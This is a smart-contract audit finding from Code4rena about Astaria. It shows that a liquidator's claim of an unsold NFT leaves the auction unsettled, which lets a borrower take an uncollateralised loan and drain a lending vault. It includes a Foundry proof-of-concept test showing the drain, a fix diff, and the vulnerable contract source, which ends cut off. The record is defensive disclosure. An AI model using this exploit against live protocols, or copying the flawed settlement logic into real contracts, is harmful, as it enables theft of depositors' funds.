{
  "Title": "[H-05] Vault may be drained after a liquidated NFT was claimed by the liquidator",
  "Content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231>\n\nThe owner of a collateral NFT that was liquidated and then claimed by the liquidator (after the auction had no bids) may drain the vault the loan was taken from.\n\n### Proof of Concept\n\nThere's an extreme situation when a liquidated and auctioned collateral NFT had no bids and the auction has expired. In this situation, the liquidator may claim the NFT by calling [CollateralToken.liquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L109). The function:\n\n1.  calls [ClearingHouse.settleLiquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220) to burn the lien token associated with the loan and clean up the accounting without repaying the actual loan (the loan cannot be repaid since there were no bids);\n2.  [releases the collateral NFT to the liquidator](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L352).\n\nHowever, the function doesn't settle the auction. As a result:\n\n1.  the `CollateralToken` is not burned ([CollateralToken.sol#L538](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L538));\n2.  the link between the collateral ID and the underlying token is not removed ([CollateralToken.sol#L537](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L537));\n3.  the link between the collateral ID and the auction is also not removed ([CollateralToken.sol#L544](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L544)).\n\nThis allows the owner of the liquidated collateral NFT to create a new lien and take the maximal loan without providing any collateral.\n\n**Exploit Scenario**\n\n1.  Alice deposits an NFT token as a collateral and takes a loan.\n2.  Alice's loan expires and her NFT collateral gets liquidated by Bob.\n3.  The collateral NFT wasn't sold off auction as there were no bids.\n4.  Bob claims the collateral NFT and receives it.\n5.  Alice takes another loan from the vault without providing any collateral.\n\nThe following PoC demonstrates the above scenario:\n\n```solidity\n// src/test/AstariaTest.t.sol\nfunction testAuctionEndNoBidsMismanagement_AUDIT() public {\n  address bob = address(2);\n  TestNFT nft = new TestNFT(6);\n  uint256 tokenId = uint256(5);\n  address tokenContract = address(nft);\n\n  // Creating a public vault and providing some liquidity.\n  address publicVault = _createPublicVault({\n    strategist: strategistOne,\n    delegate: strategistTwo,\n    epochLength: 14 days\n  });\n\n  _lendToVault(Lender({addr: bob, amountToLend: 150 ether}), publicVault);\n  (, ILienToken.Stack[] memory stack) = _commitToLien({\n    vault: publicVault,\n    strategist: strategistOne,\n    strategistPK: strategistOnePK,\n    tokenContract: tokenContract,\n    tokenId: tokenId,\n    lienDetails: blueChipDetails,\n    amount: 100 ether,\n    isFirstLien: true\n  });\n\n  uint256 collateralId = tokenContract.computeId(tokenId);\n  vm.warp(block.timestamp + 11 days);\n\n  // Liquidator liquidates the loan after expiration.\n  address liquidator = address(0x123);\n  vm.prank(liquidator);\n  OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(\n    stack,\n    uint8(0)\n  );\n\n  // Skipping the auction duration and making no bids.\n  skip(4 days);\n\n  // Liquidator claims the liquidated NFT.\n  vm.prank(liquidator);\n  COLLATERAL_TOKEN.liquidatorNFTClaim(listedOrder);\n  PublicVault(publicVault).processEpoch();\n\n  // Liquidator is the rightful owner of the collateral NFT.\n  assertEq(nft.ownerOf(tokenId), address(liquidator));\n\n  // Since the auction wasn't fully settled, the CollateralToken still exists for the collateral NFT.\n  // The borrower is the owner of the CollateralToken.\n  assertEq(COLLATERAL_TOKEN.ownerOf(collateralId), address(this));\n\n  // WETH balances at this moment:\n  // 1. the borrower keep holding the 100 ETH it borrowed earlier;\n  // 2. the vault keeps holding 50 ETH of liquidity.\n  assertEq(WETH9.balanceOf(address(this)), 100 ether);\n  assertEq(WETH9.balanceOf(address(publicVault)), 50 ether);\n\n  // The borrower creates another lien. This time, the borrower is not the owner of the collateral NFT.\n  // However, it's still the owner of the CollateralToken.\n  (, stack) = _commitToLien({\n    vault: publicVault,\n    strategist: strategistOne,\n    strategistPK: strategistOnePK,\n    tokenContract: tokenContract,\n    tokenId: tokenId,\n    lienDetails: blueChipDetails,\n    amount: 50 ether,\n    isFirstLien: true\n  });\n\n  // The borrower has taken a loan of 50 ETH from the vault.\n  assertEq(WETH9.balanceOf(address(this)), 150 ether);\n  // The vault was drained.\n  assertEq(WETH9.balanceOf(address(publicVault)), 0 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider settling the auction at the end of `settleLiquidatorNFTClaim`:\n\n```diff\ndiff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol\nindex 5c2a400..d4ee28d 100644\n--- a/src/ClearingHouse.sol\n+++ b/src/ClearingHouse.sol\n@@ -228,5 +228,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n       0,\n       s.auctionStack.stack\n     );\n+    uint256 collateralId = _getArgUint256(21);\n+    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);\n   }\n }\n```\n\n**[androolloyd (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/480)**\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-01-astaria",
  "Code": [
    {
      "filename": "src/ClearingHouse.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/**\n *  █████╗ ███████╗████████╗ █████╗ ██████╗ ██╗ █████╗\n * ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗\n * ███████║███████╗   ██║   ███████║██████╔╝██║███████║\n * ██╔══██║╚════██║   ██║   ██╔══██║██╔══██╗██║██╔══██║\n * ██║  ██║███████║   ██║   ██║  ██║██║  ██║██║██║  ██║\n * ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝\n *\n * Astaria Labs, Inc\n */\n\npragma solidity =0.8.17;\n\nimport {IAstariaRouter} from \"core/interfaces/IAstariaRouter.sol\";\nimport {WETH} from \"solmate/tokens/WETH.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {Clone} from \"clones-with-immutable-args/Clone.sol\";\nimport {IERC1155} from \"core/interfaces/IERC1155.sol\";\nimport {ILienToken} from \"core/interfaces/ILienToken.sol\";\nimport {Bytes32AddressLib} from \"solmate/utils/Bytes32AddressLib.sol\";\nimport {\n  ConduitControllerInterface\n} from \"seaport/interfaces/ConduitControllerInterface.sol\";\nimport {AmountDeriver} from \"seaport/lib/AmountDeriver.sol\";\nimport {Order} from \"seaport/lib/ConsiderationStructs.sol\";\nimport {IERC721Receiver} from \"core/interfaces/IERC721Receiver.sol\";\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\n\ncontract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n  using Bytes32AddressLib for bytes32;\n  using SafeTransferLib for ERC20;\n\n  struct ClearingHouseStorage {\n    ILienToken.AuctionData auctionStack;\n  }\n\n  uint256 private constant CLEARING_HOUSE_STORAGE_SLOT =\n    uint256(keccak256(\"xyz.astaria.ClearingHouse.storage.location\")) - 1;\n\n  function ROUTER() public pure returns (IAstariaRouter) {\n    return IAstariaRouter(_getArgAddress(0));\n  }\n\n  function COLLATERAL_ID() public pure returns (uint256) {\n    return _getArgUint256(21);\n  }\n\n  function IMPL_TYPE() public pure returns (uint8) {\n    return _getArgUint8(20);\n  }\n\n  function _getStorage()\n    internal\n    pure\n    returns (ClearingHouseStorage storage s)\n  {\n    uint256 slot = CLEARING_HOUSE_STORAGE_SLOT;\n    assembly {\n      s.slot := slot\n    }\n  }\n\n  function setAuctionData(ILienToken.AuctionData calldata auctionData)\n    external\n  {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable arg\n\n    //only execute from the conduit\n    require(msg.sender == address(ASTARIA_ROUTER.LIEN_TOKEN()));\n\n    ClearingHouseStorage storage s = _getStorage();\n    s.auctionStack = auctionData;\n  }\n\n  function supportsInterface(bytes4 interfaceId) external view returns (bool) {\n    return interfaceId == type(IERC1155).interfaceId;\n  }\n\n  function balanceOf(address account, uint256 id)\n    external\n    view\n    returns (uint256)\n  {\n    return type(uint256).max;\n  }\n\n  function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)\n    external\n    view\n    returns (uint256[] memory output)\n  {\n    output = new uint256[](accounts.length);\n    for (uint256 i; i < accounts.length; ) {\n      output[i] = type(uint256).max;\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  function setApprovalForAll(address operator, bool approved) external {}\n\n  function isApprovedForAll(address account, address operator)\n    external\n    view\n    returns (bool)\n  {\n    return true;\n  }\n\n  function _execute(\n    address tokenContract, // collateral token sending the fake nft\n    address to, // buyer\n    uint256 encodedMetaData, //retrieve token address from the encoded data\n    uint256 // space to encode whatever is needed,\n  ) internal {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable arg\n\n    ClearingHouseStorage storage s = _getStorage();\n    address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();\n\n    uint256 currentOfferPrice = _locateCurrentAmount({\n      startAmount: s.auctionStack.startAmount,\n      endAmount: s.auctionStack.endAmount,\n      startTime: s.auctionStack.startTime,\n      endTime: s.auctionStack.endTime,\n      roundUp: true //we are a consideration we round up\n    });\n    uint256 payment = ERC20(paymentToken).balanceOf(address(this));\n\n    require(payment >= currentOfferPrice, \"not enough funds received\");\n\n    uint256 collateralId = _getArgUint256(21);\n    // pay liquidator fees here\n\n    ILienToken.AuctionStack[] storage stack = s.auctionStack.stack;\n\n    uint256 liquidatorPayment = ASTARIA_ROUTER.getLiquidatorFee(payment);\n\n    ERC20(paymentToken).safeTransfer(\n      s.auctionStack.liquidator,\n      liquidatorPayment\n    );\n\n    ERC20(paymentToken).safeApprove(\n      address(ASTARIA_ROUTER.TRANSFER_PROXY()),\n      payment - liquidatorPayment\n    );\n\n    ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(\n      paymentToken,\n      collateralId,\n      payment - liquidatorPayment,\n      s.auctionStack.stack\n    );\n\n    if (ERC20(paymentToken).balanceOf(address(this)) > 0) {\n      ERC20(paymentToken).safeTransfer(\n        ASTARIA_ROUTER.COLLATERAL_TOKEN().ownerOf(collateralId),\n        ERC20(paymentToken).balanceOf(address(this))\n      );\n    }\n    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);\n  }\n\n  function safeTransferFrom(\n    address from, // the from is the offerer\n    address to,\n    uint256 identifier,\n    uint256 amount,\n    bytes calldata data //empty from seaport\n  ) public {\n    //data is empty and useless\n    _execute(from, to, identifier, amount);\n  }\n\n  function safeBatchTransferFrom(\n    address from,\n    address to,\n    uint256[] calldata ids,\n    uint256[] calldata amounts,\n    bytes calldata data\n  ) public {}\n\n  function onERC721Received(\n    address operator_,\n    address from_,\n    uint256 tokenId_,\n    bytes calldata data_\n  ) external override returns (bytes4) {\n    return IERC721Receiver.onERC721Received.selector;\n  }\n\n  function validateOrder(Order memory order) external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    Order[] memory listings = new Order[](1);\n    listings[0] = order;\n\n    ERC721(order.parameters.offer[0].token).approve(\n      ASTARIA_ROUTER.COLLATERAL_TOKEN().getConduit(),\n      order.parameters.offer[0].identifierOrCriteria\n    );\n    ASTARIA_ROUTER.COLLATERAL_TOKEN().SEAPORT().validate(listings);\n  }\n\n  function transferUnderlying(\n    address tokenContract,\n    uint256 tokenId,\n    address target\n  ) external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    ERC721(tokenContract).safeTransferFrom(address(this), target, tokenId);\n  }\n\n  function settleLiquidatorNFTClaim() external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    ClearingHouseStorage storage s = _getStorage();\n    ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(\n      address(0),\n      COLLATERAL_ID(),\n      0,\n      s.auctionStack.stack\n    );\n  }\n}"
    },
    {
      "filename": "src/CollateralToken.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/**\n *  █████╗ ███████╗████████╗ █████╗ ██████╗ ██╗ █████╗\n * ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗\n * ███████║███████╗   ██║   ███████║██████╔╝██║███████║\n * ██╔══██║╚════██║   ██║   ██╔══██║██╔══██╗██║██╔══██║\n * ██║  ██║███████║   ██║   ██║  ██║██║  ██║██║██║  ██║\n * ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝\n *\n * Astaria Labs, Inc\n */\n\npragma solidity =0.8.17;\n\npragma experimental ABIEncoderV2;\n\nimport {IAstariaRouter} from \"core/interfaces/IAstariaRouter.sol\";\nimport {ICollateralToken} from \"core/interfaces/ICollateralToken.sol\";\nimport {IERC165} from \"core/interfaces/IERC165.sol\";\nimport {IERC721} from \"core/interfaces/IERC721.sol\";\nimport {IERC721Receiver} from \"core/interfaces/IERC721Receiver.sol\";\nimport {IFlashAction} from \"core/interfaces/IFlashAction.sol\";\nimport {ILienToken} from \"core/interfaces/ILienToken.sol\";\nimport {ISecurityHook} from \"core/interfaces/ISecurityHook.sol\";\nimport {ITransferProxy} from \"core/interfaces/ITransferProxy.sol\";\nimport {Authority} from \"solmate/auth/Auth.sol\";\nimport {CollateralLookup} from \"core/libraries/CollateralLookup.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {ERC721} from \"gpl/ERC721.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {VaultImplementation} from \"core/VaultImplementation.sol\";\nimport {ZoneInterface} from \"seaport/interfaces/ZoneInterface.sol\";\nimport {Bytes32AddressLib} from \"solmate/utils/Bytes32AddressLib.sol\";\nimport {\n  ClonesWithImmutableArgs\n} from \"clones-with-immutable-args/ClonesWithImmutableArgs.sol\";\n\nimport {\n  ConduitControllerInterface\n} from \"seaport/interfaces/ConduitControllerInterface.sol\";\nimport {\n  ConsiderationInterface\n} from \"seaport/interfaces/ConsiderationInterface.sol\";\nimport {\n  AdvancedOrder,\n  CriteriaResolver,\n  OfferItem,\n  ConsiderationItem,\n  ItemType,\n  OrderParameters,\n  OrderComponents,\n  OrderType,\n  Order\n} from \"seaport/lib/ConsiderationStructs.sol\";\n\nimport {Consideration} from \"seaport/lib/Consideration.sol\";\nimport {SeaportInterface} from \"seaport/interfaces/SeaportInterface.sol\";\nimport {ClearingHouse} from \"core/ClearingHouse.sol\";\nimport {AuthInitializable} from \"core/AuthInitializable.sol\";\n\ncontract CollateralToken is\n  AuthInitializable,\n  ERC721,\n  IERC721Receiver,\n  ICollateralToken,\n  ZoneInterface\n{\n  using SafeTransferLib for ERC20;\n  using CollateralLookup for address;\n  using FixedPointMathLib for uint256;\n  uint256 private constant COLLATERAL_TOKEN_SLOT =\n    uint256(keccak256(\"xyz.astaria.CollateralToken.storage.location\")) - 1;\n\n  constructor() {\n    _disableInitializers();\n  }\n\n  function initialize(\n    Authority AUTHORITY_,\n    ITransferProxy TRANSFER_PROXY_,\n    ILienToken LIEN_TOKEN_,\n    ConsiderationInterface SEAPORT_\n  ) public initializer {\n    __initAuth(msg.sender, address(AUTHORITY_));\n    __initERC721(\"Astaria Collateral Token\", \"ACT\");\n    CollateralStorage storage s = _loadCollateralSlot();\n    s.TRANSFER_PROXY = TRANSFER_PROXY_;\n    s.LIEN_TOKEN = LIEN_TOKEN_;\n    s.SEAPORT = SEAPORT_;\n    (, , address conduitController) = s.SEAPORT.information();\n    bytes32 CONDUIT_KEY = Bytes32AddressLib.fillLast12Bytes(address(this));\n    s.CONDUIT_KEY = CONDUIT_KEY;\n    s.CONDUIT_CONTROLLER = ConduitControllerInterface(conduitController);\n\n    s.CONDUIT = s.CONDUIT_CONTROLLER.createConduit(CONDUIT_KEY, address(this));\n    s.CONDUIT_CONTROLLER.updateChannel(\n      address(s.CONDUIT),\n      address(SEAPORT_),\n      true\n    );\n  }\n\n  function SEAPORT() public view returns (ConsiderationInterface) {\n    return _loadCollateralSlot().SEAPORT;\n  }\n\n  function liquidatorNFTClaim(OrderParameters memory params) external {\n    CollateralStorage storage s = _loadCollateralSlot();\n\n    uint256 collateralId = params.offer[0].token.computeId(\n      params.offer[0].identifierOrCriteria\n    );\n    address liquidator = s.LIEN_TOKEN.getAuctionLiquidator(collateralId);\n    if (\n      s.collateralIdToAuction[collateralId] == bytes32(0) ||\n      liquidator == address(0)\n    ) {\n      //revert no auction\n      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n    }\n    if (\n      s.collateralIdToAuction[collateralId] != keccak256(abi.encode(params))\n    ) {\n      //revert auction params dont match\n      revert InvalidCollateralState(\n        InvalidCollateralStates.INVALID_AUCTION_PARAMS\n      );\n    }\n\n    if (block.timestamp < params.endTime) {\n      //auction hasn't ended yet\n      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n    }\n\n    Asset memory underlying = s.idToUnderlying[collateralId];\n    address tokenContract = underlying.tokenContract;\n    uint256 tokenId = underlying.tokenId;\n    ClearingHouse CH = ClearingHouse(payable(s.clearingHouse[collateralId]));\n    CH.settleLiquidatorNFTClaim();\n    _releaseToAddress(s, underlying, collateralId, liquidator);\n  }\n\n  function _loadCollateralSlot()\n    internal\n    pure\n    returns (CollateralStorage storage s)\n  {\n    uint256 slot = COLLATERAL_TOKEN_SLOT;\n\n    assembly {\n      s.slot := slot\n    }\n  }\n\n  function isValidOrder(\n    bytes32 orderHash,\n    address caller,\n    address offerer,\n    bytes32 zoneHash\n  ) external view returns (bytes4 validOrderMagicValue) {\n    CollateralStorage storage s = _loadCollateralSlot();\n    return\n      s.collateralIdToAuction[uint256(zoneHash)] == orderHash\n        ? ZoneInterface.isValidOrder.selector\n        : bytes4(0xffffffff);\n  }\n\n  // Called by Consideration whenever any extraData is provided by the caller.\n  function isValidOrderIncludingExtraData(\n    bytes32 orderHash,\n    address caller,\n    AdvancedOrder calldata order,\n    bytes32[] calldata priorOrderHashes,\n    CriteriaResolver[] calldata criteriaResolvers\n  ) external view returns (bytes4 validOrderMagicValue) {\n    CollateralStorage storage s = _loadCollateralSlot();\n    return\n      s.collateralIdToAuction[uint256(order.parameters.zoneHash)] == orderHash\n        ? ZoneInterface.isValidOrder.selector\n        : bytes4(0xffffffff);\n  }\n\n  function supportsInterface(bytes4 interfaceId)\n    public\n    view\n    override(ERC721, IERC165)\n    returns (bool)\n  {\n    return\n      interfaceId == type(ICollateralToken).interfaceId ||\n      super.supportsInterface(interfaceId);\n  }\n\n  function fileBatch(File[] calldata files) external requiresAuth {\n    uint256 i;\n    for (; i < files.length; ) {\n      _file(files[i]);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  function file(File calldata incoming) public requiresAuth {\n    _file(incoming);\n  }\n\n  function _file(File calldata incoming) internal {\n    CollateralStorage storage s = _loadCollateralSlot();\n\n    FileType what = incoming.what;\n    bytes memory data = incoming.data;\n    if (what == FileType.AstariaRouter) {\n      address addr = abi.decode(data, (address));\n      s.ASTARIA_ROUTER = IAstariaRouter(addr);\n    } else if (what == FileType.SecurityHook) {\n      (address target, address hook) = abi.decode(data, (address, address));\n      s.securityHooks[target] = hook;\n    } else if (what == FileType.FlashEnabled) {\n      (address target, bool enabled) = abi.decode(data, (address, bool));\n      s.flashEnabled[target] = enabled;\n    } else if (what == FileType.Seaport) {\n      s.SEAPORT = ConsiderationInterface(abi.decode(data, (address)));\n      (, , address conduitController) = s.SEAPORT.information();\n      if (s.CONDUIT_KEY == bytes32(0)) {\n        s.CONDUIT_KEY = Bytes32AddressLib.fillLast12Bytes(address(this));\n      }\n      s.CONDUIT_CONTROLLER = ConduitControllerInterface(conduitController);\n      (address conduit, bool exists) = s.CONDUIT_CONTROLLER.getConduit(\n        s.CONDUIT_KEY\n      );\n      if (!exists) {\n        s.CONDUIT = s.CONDUIT_CONTROLLER.createConduit(\n          s.CONDUIT_KEY,\n          address(this)\n        );\n      } else {\n        s.CONDUIT = conduit;\n      }\n      s.CONDUIT_CONTROLLER.updateChannel(\n        address(s.CONDUIT),\n        address(s.SEAPORT),\n        true\n      );\n    } else {\n      revert UnsupportedFile();\n    }\n    emit FileUpdated(what, data);\n  }\n\n  modifier releaseCheck(uint256 collateralId) {\n    CollateralStorage storage s = _loadCollateralSlot();\n\n    if (s.LIEN_TOKEN.getCollateralState(collateralId) != bytes32(0)) {\n      revert InvalidCollateralState(InvalidCollateralStates.ACTIVE_LIENS);\n    }\n    if (s.collateralIdToAuction[collateralId] != bytes32(0)) {\n      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n    }\n    _;\n  }\n\n  modifier onlyOwner(uint256 collateralId) {\n    require(ownerOf(collateralId) == msg.sender);\n    _;\n  }\n\n  function flashAction(\n    IFlashAction receiver,\n    uint256 collateralId,\n    bytes calldata data\n  ) external onlyOwner(collateralId) {\n    address addr;\n    uint256 tokenId;\n    CollateralStorage storage s = _loadCollateralSlot();\n    (addr, tokenId) = getUnderlying(collateralId);\n\n    if (!s.flashEnabled[addr]) {\n      revert InvalidCollateralState(InvalidCollateralStates.FLASH_DISABLED);\n    }\n\n    if (\n      s.LIEN_TOKEN.getCollateralState(collateralId) == bytes32(\"ACTIVE_AUCTION\")\n    ) {\n      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);\n    }\n\n    bytes32 preTransferState;\n    //look to see if we have a security handler for this asset\n\n    address securityHook = s.securityHooks[addr];\n    if (securityHook != address(0)) {\n      preTransferState = ISecurityHook(securityHook).getState(addr, tokenId);\n    }\n    // transfer the NFT to the destination optimistically\n\n    ClearingHouse(s.clearingHouse[collateralId]).transferUnderlying(\n      addr,\n      tokenId,\n      address(receiver)\n    );\n\n    //trigger the flash action on the receiver\n    if (\n      receiver.onFlashAction(\n        IFlashAction.Underlying(s.clearingHouse[collateralId], addr, tokenId),\n        data\n      ) != keccak256(\"FlashAction.onFlashAction\")\n    ) {\n      revert FlashActionCallbackFailed();\n    }\n\n    if (\n      securityHook != address(0) &&\n      preTransferState != ISecurityHook(securityHook).getState(addr, tokenId)\n    ) {\n      revert FlashActionSecurityCheckFailed();\n    }\n\n    // validate that the NFT returned after the call\n\n    if (\n      IERC721(addr).ownerOf(tokenId) != address(s.clearingHouse[collateralId])\n    ) {\n      revert FlashActionNFTNotReturned();\n    }\n  }\n\n  function releaseToAddress(uint256 collateralId, address releaseTo)\n    public\n    releaseCheck(collateralId)\n    onlyOwner(collateralId)\n  {\n    CollateralStorage storage s = _loadCollateralSlot();\n\n    if (msg.sender != ownerOf(collateralId)) {\n      revert InvalidSender();\n    }\n    Asset memory underlying = s.idToUnderlying[collateralId];\n    address tokenContract = underlying.tokenContract;\n    _burn(collateralId);\n    delete s.idToUnderlying[collateralId];\n    _releaseToAddress(s, underlying, collateralId, releaseTo);\n  }\n\n  /**\n   * @dev Transfers locked collateral to a specified address and deletes the reference to the CollateralToken for that NFT.\n   * @param releaseTo The address to send the NFT to.\n   */\n  function _releaseToAddress(\n    CollateralStorage storage s,\n    Asset memory underlyingAsset,\n    uint256 collateralId,\n    address releaseTo\n  ) internal {\n    ClearingHouse(s.clearingHouse[collateralId]).transferUnderlying(\n      underlyingAsset.tokenContract,\n      underlyingAsset.tokenId,\n      releaseTo\n    );\n    emit ReleaseTo(\n      underlyingAsset.tokenContract,\n      underlyingAsset.tokenId,\n      releaseTo\n    );\n  }\n\n  function getConduitKey() public view returns (bytes32) {\n    CollateralStorage storage s = _loadCollateralSlot();\n    return s.CONDUIT_KEY;\n  }\n\n  function getConduit() public view returns (address) {\n    CollateralStorage storage s = _loadCollateralSlot();\n    return s.CONDUIT;\n  }\n\n  /**\n   * @notice Retrieve the address and tokenId of the underlying NFT of a CollateralToken.\n   * @param collateralId The ID of the CollateralToken wrapping the NFT.\n   * @return The address and tokenId of the underlying NFT.\n   */\n  function getUnderlying(uint256 collateralId)\n    public\n    view\n    returns (address, uint256)\n  {\n    Asset memory underlying = _loadCollateralSlot().idToUnderlying[\n      collateralId\n    ];\n    return (underlying.tokenContract, underlying.tokenId);\n  }\n\n  /**\n   * @notice Retrieve the tokenURI for a CollateralToken.\n   * @param collateralId The ID of the CollateralToken.\n   * @return the URI of the CollateralToken.\n   */\n  function tokenURI(uint256 collateralId)\n    public\n    view\n    virtual\n    override(ERC721, IERC721)\n    returns (string memory)\n  {\n    (address underlyingAsset, uint256 assetId) = getUnderlying(collateralId);\n    return ERC721(underlyingAsset).tokenURI(assetId);\n  }\n\n  function securityHooks(address target) public view returns (address) {\n    return _loadCollateralSlot().securityHooks[target];\n  }\n\n  function getClearingHouse(uint256 collateralId)\n    external\n    view\n    returns (ClearingHouse)\n  {\n    return\n      ClearingHouse(payable(_loadCollateralSlot().clearingHouse[collateralId]));\n  }\n\n  function _generateValidOrderParameters(\n    CollateralStorage storage s,\n    address settlementToken,\n    uint256 collateralId,\n    uint256[] memory prices,\n    uint256 maxDuration\n  ) internal returns (OrderParameters memory orderParameters) {\n    OfferItem[] memory offer = new OfferItem[](1);\n\n    Asset memory underlying = s.idToUnderlying[collateralId];\n\n    offer[0] = OfferItem(\n      ItemType.ERC721,\n      underlying.tokenContract,\n      underlying.tokenId,\n      1,\n      1\n    );\n\n    ConsiderationItem[] memory considerationItems = new ConsiderationItem[](2);\n    considerationItems[0] = ConsiderationItem(\n      ItemType.ERC20,\n      settlementToken,\n      uint256(0),\n      prices[0],\n      prices[1],\n      payable(address(s.clearingHouse[collateralId]))\n    );\n    considerationItems[1] = ConsiderationItem(\n      ItemType.ERC1155,\n      s.clearingHouse[collateralId],\n      uint256(uint160(settlementToken)),\n      prices[0],\n      prices[1],\n      payable(s.clearingHouse[collateralId])\n    );\n\n    orderParameters = OrderParameters({\n      offerer: s.clearingHouse[collateralId],\n      zone: address(this), // 0x20\n      offer: offer,\n      consideration: considerationItems,\n      orderType: OrderType.FULL_OPEN,\n      startTime: uint256(block.timestamp),\n      endTime: uint256(block.timestamp + maxDuration),\n      zoneHash: bytes32(collateralId),\n      salt: uint256(blockhash(block.number)),\n      conduitKey: s.CONDUIT_KEY, // 0x120\n      totalOriginalConsiderationItems: considerationItems.length\n    });\n  }\n\n  function auctionVault(AuctionVaultParams calldata params)\n    external\n    requiresAuth\n    returns (OrderParameters memory orderParameters)\n  {\n    CollateralStorage storage s = _loadCollateralSlot();\n\n    uint256[] memory prices = new uint256[](2);\n    prices[0] = params.startingPrice;\n    prices[1] = params.endingPrice;\n    orderParameters = _generateValidOrderParameters(\n      s,\n      params.settlementToken,\n      params.collateralId,\n      prices,\n      params.maxDuration\n    );\n\n    _listUnderlyingOnSeaport(\n      s,\n      params.collateralId,\n      Order(orderParameters, new bytes(0))\n    );\n  }\n\n  function _listUnderlyingOnSeaport(\n    CollateralStorage storage s,\n    uint256 collateralId,\n    Order memory listingOrder\n  ) internal {\n    //get total Debt and ensure its being sold for more than that\n\n    if (listingOrder.parameters.conduitKey != s.CONDUIT_KEY) {\n      revert InvalidConduitKey();\n    }\n    if (listingOrder.parameters.zone != address(this)) {\n      revert InvalidZone();\n    }\n\n    ClearingHouse(s.clearingHouse[collateralId]).validateOrder(listingOrder);\n    emit ListedOnSeaport(collateralId, listingOrder);\n\n    s.collateralIdToAuction[collateralId] = keccak256(\n      abi.encode(listingOrder.parameters)\n    );\n  }\n\n  function settleAuction(uint256 collateralId) public {\n    CollateralStorage storage s = _loadCollateralSlot();\n    if (\n      s.collateralIdToAuction[collateralId] == bytes32(0) &&\n      ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(\n        s.idToUnderlying[collateralId].tokenId\n      ) !=\n      s.clearingHouse[collateralId]\n    ) {\n      revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);\n    }\n    require(msg.sender == s.clearingHouse[collateralId]);\n    _settleAuction(s, collateralId);\n    delete s.idToUnderlying[collateralId];\n    _burn(collateralId);\n  }\n\n  function _settleAuction(CollateralStorage storage s, uint256 collateralId)\n    internal\n  {\n    delete s.collateralIdToAuction[collateralId];\n  }\n\n  /**\n   * @dev Mints a new CollateralToken wrapping an NFT.\n   * @param from_ the owner of the collateral deposited\n   * @param tokenId_ The NFT token ID\n   * @return a static return of the receive signature\n   */\n  function onERC721Received(\n    address, /* operator_ */\n    address from_,\n    uint256 tokenId_,\n    bytes calldata // calldata data_\n  ) external override whenNotPaused returns (bytes4) {\n    CollateralStorage storage s = _loadCollateralSlot();\n    uint256 collateralId = msg.sender.computeId(tokenId_);\n\n    Asset memory incomingAsset = s.idToUnderlying[collateralId];\n    if (incomingAsset.tokenContract == address(0)) {\n      require(ERC721(msg.sender).ownerOf(tokenId_) == address(this));\n\n      if (s.clearingHouse[collateralId] == address(0)) {\n        address clearingHouse 